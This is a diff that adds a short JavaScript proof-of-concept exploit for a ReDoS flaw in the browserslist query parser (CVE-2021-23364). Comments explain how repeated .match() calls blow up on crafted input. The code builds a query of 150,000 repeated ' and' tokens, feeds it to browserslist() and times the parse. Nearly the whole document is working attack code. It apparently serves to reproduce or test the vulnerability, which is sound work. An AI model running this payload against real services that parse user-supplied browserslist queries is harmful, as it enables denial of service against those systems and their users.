@@ -1,0 +1,25 @@
+```javascript
+// Exploit for ReDoS / algorithmic-complexity DoS in browserslist's query parser
+// (CVE-2021-23364 / GHSA-w8qv-6qwh-9hch) — vulnerable versions < 4.16.5
+// The `resolve`/`doMatch`/`find` functions repeatedly call String.prototype.match()
+// on ever-growing substrings of the attacker-controlled query, causing
+// polynomial-time (near-cubic) blowup on crafted input.
+
+const browserslist = require("./node_modules/browserslist");
+
+// Build a malicious query string: many repetitions of " and" force the
+// parser's find()/doMatch() loop to re-run .match() over growing substrings.
+const maliciousQuery = " and".repeat(150000);
+
+console.log("Triggering browserslist() with malicious query, length:", maliciousQuery.length);
+
+const start = process.hrtime.bigint();
+try {
+  browserslist(maliciousQuery);
+} catch (e) {
+  // Query is intentionally invalid; we only care about how long parsing took.
+}
+const end = process.hrtime.bigint();
+
+console.log("Elapsed time (ms):", Number(end - start) / 1e6);
+```
